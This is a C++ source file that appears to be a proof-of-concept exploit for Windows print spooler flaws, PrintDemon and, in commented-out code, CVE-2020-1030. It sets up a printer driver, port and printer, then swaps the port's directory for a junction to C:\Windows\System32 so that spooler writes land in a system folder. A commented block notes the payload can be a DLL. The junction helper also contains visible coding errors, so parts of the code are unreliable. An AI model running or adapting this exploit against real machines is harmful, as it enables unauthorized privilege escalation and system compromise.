#include <iostream>
#include <Windows.h>

#include "printers.h"
#include "utils.h"; 
#include "exploits.h"



//---------------------------------------


typedef struct _REPARSE_DATA_BUFFER {
	ULONG  ReparseTag;
	USHORT  ReparseDataLength;
	USHORT  Reserved;
	union {
		struct {
			USHORT SubstituteNameOffset;
			USHORT SubstituteNameLength;
			USHORT PrintNameOffset;
			USHORT PrintNameLength;
			ULONG Flags;
			WCHAR PathBuffer[1];
		} SymbolicLinkReparseBuffer;
		struct {
			USHORT SubstituteNameOffset;
			USHORT SubstituteNameLength;
			USHORT PrintNameOffset;
			USHORT PrintNameLength;
			WCHAR PathBuffer[1];
		} MountPointReparseBuffer;
		struct {
			UCHAR DataBuffer[1];
		} GenericReparseBuffer;
	};
} REPARSE_DATA_BUFFER;

#define REPARSE_MOUNTPOINT_HEADER_SIZE 8

bool createJunction(WCHAR* linkPath, WCHAR* newTargetPath) {
	int create_status = CreateDirectory(linkPath, NULL);

	// If the directory already existed, treat it as a success.
	if (create_status == 0 && (GetLastError() != ERROR_ALREADY_EXISTS || (GetFileAttributesW(linkPath) & FILE_ATTRIBUTE_DIRECTORY) != 0))
		return false;

	HANDLE handle = CreateFile(linkPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
	if (handle == INVALID_HANDLE_VALUE)
	{
		printf(("Could not open dir '%s'; error: %d\n"), linkPath, GetLastError());
		CloseHandle(handle);
		return false;
	}

	int target_len = wcslen(newTargetPath);
	if (target_len > MAX_PATH - 1) {
		CloseHandle(handle);
		return false;
	}

	int reparse_data_buffer_size = sizeof REPARSE_DATA_BUFFER + 2 * MAX_PATH * sizeof WCHAR;
	REPARSE_DATA_BUFFER* reparse_data_buffer = static_cast<REPARSE_DATA_BUFFER*>(calloc(reparse_data_buffer_size, 1));

	reparse_data_buffer->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
	wcscpy_s(reparse_data_buffer->MountPointReparseBuffer.PathBuffer, newTargetPath);
	wcscpy_s(reparse_data_buffer->MountPointReparseBuffer.PathBuffer, newTargetPath);
	(reparse_data_buffer->MountPointReparseBuffer.PathBuffer + target_len + 1, newTargetPath);
	reparse_data_buffer->MountPointReparseBuffer.SubstituteNameOffset = 0;
	reparse_data_buffer->MountPointReparseBuffer.SubstituteNameLength = target_len * sizeof(WCHAR);
	reparse_data_buffer->MountPointReparseBuffer.PrintNameOffset = (target_len + 1) * sizeof(WCHAR);
	reparse_data_buffer->MountPointReparseBuffer.PrintNameLength = target_len * sizeof(WCHAR);
	reparse_data_buffer->ReparseDataLength = (target_len + 1) * 2 * sizeof(WCHAR) + REPARSE_MOUNTPOINT_HEADER_SIZE;

	DWORD dummy_received_bytes;
	int result = DeviceIoControl(
		handle,
		FSCTL_SET_REPARSE_POINT,
		reparse_data_buffer,
		reparse_data_buffer->ReparseDataLength + REPARSE_MOUNTPOINT_HEADER_SIZE,
		NULL,
		0,
		&dummy_received_bytes,
		NULL);
	if (CloseHandle(handle) == 0)
		return false;
	free(reparse_data_buffer);

	return (result != 0);
}



// ----------------------------------------


struct PrinterExploitInfo {
	wchar_t *driverName, *portName, *printerName; 
	PrinterExploitInfo(wchar_t* driverName, wchar_t* portName, wchar_t* printerName)
		: driverName(driverName), portName(portName), printerName(printerName) {}
};

int main(int argc, wchar_t* argv[]) {

	bool isRestarted = isAppStartedFromReboot(argc, argv);

	// PrintDemon 
	PrinterExploitInfo printDemonInfo(
		const_cast<wchar_t*>(L"Generic / Text Only"),
		const_cast<wchar_t*>(L"C:\\Users\\Bob\\Desktop\\tmp\\myport.txt"),
		const_cast<wchar_t*>(L"print_demon printer"));


	if (!isRestarted) {
		//bypassPD: creation tmp directory
		bool isCreatedTmp = CreateDirectoryW(L"C:\\Users\\Bob\\Desktop\\tmp", NULL);
		if (!isCreatedTmp) {
			std::cout << "[-] Tmp dir ERROR :" << GetLastError() << std::endl;
			return -1;
		}
		std::cout << "[+] Tmp dir created !\n";

		HRESULT driverResult = AddDriver(printDemonInfo.driverName);
		DWORD portResult = AddPort(printDemonInfo.portName);
		HANDLE hPrinter = AddPrinter(printDemonInfo.printerName, printDemonInfo.driverName, printDemonInfo.portName);
		ClosePrinter(hPrinter);

		//bypassPD: removal tmp dir + creation symbolic link
		bool isRemovedTmp = RemoveDirectoryW(L"C:\\Users\\Bob\\Desktop\\tmp");
		
		if(!isRemovedTmp) {
			std::cout << "[-] Removed directory ERROR: " << GetLastError();
			return -1;
		}

		std::cout << "[+] Tmp dir correctly removed !\n";


		//createJunction(const_cast<wchar_t*>(L"C:\\Users\\Bob\\Desktop\\tmp"), const_cast<wchar_t*>(L"C:\\Users\\Bob\\Desktop\\program"));
		system("cmd /c mklink  /J \"C:\\Users\\Bob\\Desktop\\tmp\" \"C:\\Windows\\System32\"");


		/*
		//bypassPD: create symbolic link to SYSTEM32
		HANDLE hToken;
		LUID luid;
		if (LookupPrivilegeValue(NULL, L"SeCreateSymbolicLinkPrivilege", &luid))
		{
			// Get a token for this process. 
			if (!OpenProcessToken(GetCurrentProcess(),
				TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
				std::cout << "[-] Error while obtaining token for current process: " << GetLastError() << std::endl;
				return -1;
			}
		
			std::cout << "[+] Obtained token for current process" << std::endl;
			
			TOKEN_PRIVILEGES token_privileges;
			token_privileges.PrivilegeCount = 1;
			token_privileges.Privileges[0].Luid = luid;
			token_privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			if (!AdjustTokenPrivileges(hToken, FALSE, &token_privileges, 0, NULL, NULL))
			{
				std::cout << "[-] Error:" << GetLastError();// TODO: call GetLastError and report an error.
				return -1;
			}

			std::cout << "[+] Ok it works\n";

		}

		bool isCreateSymbolic = CreateSymbolicLinkW(L"C:\\Users\\Bob\\Desktop\\tmp", L"C:\\Users\\Bob\\Desktop\\program",
			0x0 );

		if (!isCreateSymbolic) {
			std::cout << "[-] Symbolic link ERROR: " << GetLastError()<< std::endl;
			return -1;
		}
		
		std::cout << "[+] Symbolic link CREATED" << std::endl;
		*/



	}



	std::string payload = "Hello, PrintDemon";
	print_demon(printDemonInfo.printerName, payload, isRestarted);

	/*
	// cve_2020_1030 
	PrinterExploitInfo cve_2020_1030Info(
		const_cast<wchar_t*>(L"Microsoft Print To PDF"),
		const_cast<wchar_t*>(L"PORTPROMPT:"),
		const_cast<wchar_t*>(L"cve_2020_1030 printer"));

	if (!isRestarted) {
		HRESULT driverResult = AddDriver(cve_2020_1030Info.driverName);
		DWORD portResult = AddPort(cve_2020_1030Info.portName);
		HANDLE hPrinter = AddPrinter(cve_2020_1030Info.printerName, cve_2020_1030Info.driverName, cve_2020_1030Info.portName);
		ClosePrinter(hPrinter);
	}
	wchar_t* filePath = const_cast<wchar_t*>(L"C:\\Users\\User\\Desktop\\payload.txt"); // can also be .dll 
	// std::string fileName = "cve_2020_1030.txt"; // file to insert inside C:\Windows\System32\spool\drivers\x64\4
	cve_2020_1030(cve_2020_1030Info.printerName, filePath, isRestarted); 
	*/
	return 0; 
}